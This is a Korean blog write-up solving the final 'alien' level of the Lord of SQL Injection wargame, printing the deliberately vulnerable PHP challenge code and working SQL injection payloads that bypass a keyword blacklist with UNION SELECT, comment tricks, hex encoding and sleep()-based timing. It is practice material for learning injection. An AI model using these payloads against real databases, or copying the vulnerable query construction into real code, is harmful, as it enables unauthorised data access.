---
title: "[Lord of SQL Injection] LoS - alien 문제풀이"
date: 2018-09-19
draft: false
category: [wargame]
subcategories: [lord-of-sql-injection]
tags: [Write-up, Lord of SQL Injection]
---

와 드디어 `Lord of SQL Injection`을 `All Clear` 했다.
신난다!!
마지막 문제의 이름은 `alien`이다.  

<!--more-->

코드는 다음과 같다.  

```php
-------------------------------------------------------------
query : select id from prob_alien where no=
-------------------------------------------------------------

-------------------------------------------------------------
query2 : select id from prob_alien where no=''
-------------------------------------------------------------

<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/admin|and|or|if|coalesce|case|_|\.|prob|time/i', $_GET['no'])) exit("No Hack ~_~");
  $query = "select id from prob_alien where no={$_GET[no]}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $query2 = "select id from prob_alien where no='{$_GET[no]}'";
  echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
  if($_GET['no']){
    $r = mysql_fetch_array(mysql_query($query));
    if($r['id'] !== "admin") exit("sandbox1");
    $r = mysql_fetch_array(mysql_query($query));
    if($r['id'] === "admin") exit("sandbox2");
    $r = mysql_fetch_array(mysql_query($query2));
    if($r['id'] === "admin") exit("sandbox");
    $r = mysql_fetch_array(mysql_query($query2));
    if($r['id'] === "admin") solve("alien");
  }
  highlight_file(__FILE__);
?>
```

예전에 뭔가 `POXX`에서 비슷한 문제가 있었던 것 같은데 잘 기억이 안난다.
`Write-up`도 어딘가에 있을 것 같은데 못찾겠다.
문제를 풀기 위해서는 총 4개의 `조건문`을 통과해야 한다.  

```bash
1. result !== "admin" : 결과 값이 admin이 아니면 exit => admin 이어야 함 
2. result === "admin" : 결과 값이 admin이면 exit => admin이 아니어야 함  
3. result === "admin" : 결과 값이 admin이면 exit => admin이 아니어야 함  
4. result === "admin" : 결과 값이 admin이면 solve => admin 이어야 함  
```

1번과 2번은 `no`에 `싱글쿼터`가 없지만, 3번과 4번 조건문에서는 `싱글쿼터`가 존재한다.
싱글쿼터가 없을 때와 있을 때를 우회 해 원하는 값을 뽑는 것은 생각보다 쉽다.  

```plain
?no=1 union select 1#' union select '1
```

위와 같이 입력하면 완성되는 `$query`와 `$query2`는 다음과 같다.  

```mysql
$query1 : select id from prob_alien where no=1 union select 1#' union select '1
```

```mysql
$query2 : select id from prob_alien where no='1 union select 1#' union select '1'
```

첫 번째 쿼리의 경우, `#`이 주석 처리 되기 때문에 `#` 이후의 `' union select '1`은 체크하지 않는다.
반면 두 번째 쿼리에서는 `1 union select 1#` 까지가 `no`의 값으로 들어가기 때문에 `#` 이후의 `union select '1'`이 실행된다.
여기까진 쉽게 알아냈는데, 문제는 한 쿼리문으로 어쩔 때는 `admin`이어야 하고 어쩔 때는 `admin`이면 안되는 쿼리문을 만들어야 하는 것이었다.
이것도 주변에 물어봐서 풀 수 있었는데, 바로 `시간`을 활용하면 됬다.  

```plain
?no=1 union select concat(lower(hex(10+(!sleep(1)&&now()%2=1))), 0x646d696e)#' union select concat(lower(hex(9+(!sleep(1)&&now()%2=1))), 0x646d696e)#
```

먼저 첫 번째 쿼리를 살펴보면 다음과 같다.
`!sleep(1)&&now()%2=1` 은 현재 시간에 따라서 `0` 혹은 `1`을 반환 해 준다.
이 후, `hex(10 + 0 OR 1)`이 되는데, 이 때 `hex(10)`은 `A`가, `hex(11)`은 `B`가 된다.
이를 `lower()`를 통해 소문자로 바꾼 후, `concat()`을 통해서 `0x646d696e`와 합친다.
`0x646d696e`는 `dmin`이므로, 최종적인 결과 값은 시간에 따라서 `admin` 혹은 `bdmin`이 될 것이다.

`sleep(1)`을 걸어서 첫 번째가 `0`이라면 바로 다음 두번째로 쿼리를 실행할 때는 `1`이 나오도록 했다.
두 번째 쿼리에서는 `hex(10+`가 아니라 `hex(9+`를 했다.
나와야 하는 결과 값을 살펴보면 순서대로 `hex(10) -> hex(11) -> hex(11) -> hex(10)`이다.
하지만 계속해서 `sleep(1)`을 실행하게 되면 무조건 `hex(10) -> hex(11) -> hex(10) -> hex(11)` 혹은 `hex(11) -> hex(10) -> hex(11) -> hex(10)`이 나오게 된다.
여기서 `hex(10)`만 제대로 나오면 되고 `hex(11)`은 다른 값이 나와도 상관 없으므로, 두 번째 쿼리에서 `hex(9+`로 바꿔 주어 `hex(10) -> hex(11) -> hex(9) -> hex(10)`이 나오게 했다.
그러면 나오는 결과는 순서대로 `admin -> bdmin -> 9dmin -> admin`이 되어 문제를 풀 수 있다.
다만, 처음 쿼리를 실행할 때 `admin`이 나올 수 있는 시간이어야 하므로 바로 한 번에 문제가 풀리지는 않는다.  

```php
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
query : select id from prob_alien where no=1 union select concat(lower(hex(10+(!sleep(1)&&now()%2=1))), 0x646d696e)#' union select concat(lower(hex(9+(!sleep(1)&&now()%2=1))), 0x646d696e)#
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
query2 : select id from prob_alien where no='1 union select concat(lower(hex(10+(!sleep(1)&&now()%2=1))), 0x646d696e)#' union select concat(lower(hex(9+(!sleep(1)&&now()%2=1))), 0x646d696e)#'
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

ALIEN Clear!
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/admin|and|or|if|coalesce|case|_|\.|prob|time/i', $_GET['no'])) exit("No Hack ~_~");
  $query = "select id from prob_alien where no={$_GET[no]}";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $query2 = "select id from prob_alien where no='{$_GET[no]}'";
  echo "<hr>query2 : <strong>{$query2}</strong><hr><br>";
  if($_GET['no']){
    $r = mysql_fetch_array(mysql_query($query));
    if($r['id'] !== "admin") exit("sandbox1");
    $r = mysql_fetch_array(mysql_query($query));
    if($r['id'] === "admin") exit("sandbox2");
    $r = mysql_fetch_array(mysql_query($query2));
    if($r['id'] === "admin") exit("sandbox");
    $r = mysql_fetch_array(mysql_query($query2));
    if($r['id'] === "admin") solve("alien");
  }
  highlight_file(__FILE__);
?>
```

---

```plain
ALIEN Clear!!
```

드디어 `Lord of SQL Injection`을 `ALL Clear` 했다!
아 너무 뿌듯하다 ㅠㅠ
모르는게 너무 많아서 주변에 많이 물어보면서 풀었는데, 이 부분이 좀 아쉽다.
더 열심히 공부해서 아무한테도 안물어보고 문제를 슝슝 풀 수 있게 되었으면 좋겠다!
이제 풀다 말았던 `pwnable.kr`을 다시 풀어야 겠다. ㅎㅎ

---

```plain
Lord of SQL Injection All Clear!!  
```

![](/images/los/alien/alien_01.png)
